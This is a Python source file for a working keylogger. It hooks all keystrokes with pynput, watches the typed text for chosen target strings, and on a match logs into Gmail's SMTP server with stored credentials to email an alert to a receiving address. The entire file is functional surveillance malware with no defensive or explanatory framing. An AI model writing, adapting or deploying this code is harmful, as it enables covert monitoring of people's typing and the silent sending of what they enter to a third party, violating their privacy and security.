import pynput.keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self, time, email, password, receiver_email, subject, target_strings):
        self.stored_keys = ""
        self.time = time
        self.email = email
        self.password = password
        self.receiver_email = receiver_email
        self.subject = subject
        self.target_strings = target_strings

    def log(self, string):
        self.stored_keys += string

    def key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = ""
        self.log(current_key)

    def send_alert(self, message):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.receiver_email
        msg['Subject'] = self.subject
        body = message
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        text = msg.as_string()
        server.sendmail(self.email, self.receiver_email, text)
        server.quit()

    def report(self):
        for target_string in self.target_strings:
            if len(self.stored_keys) >= len(target_string) and self.stored_keys[-len(target_string):].lower() == target_string.lower():
                message = f"Alert: '{target_string}' entered! in the system 1"
                self.send_alert(message)
                print(message)
                self.stored_keys = ""
                break
        timer = threading.Timer(self.time, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboard_listener as listener:
            self.report()
            listener.join()
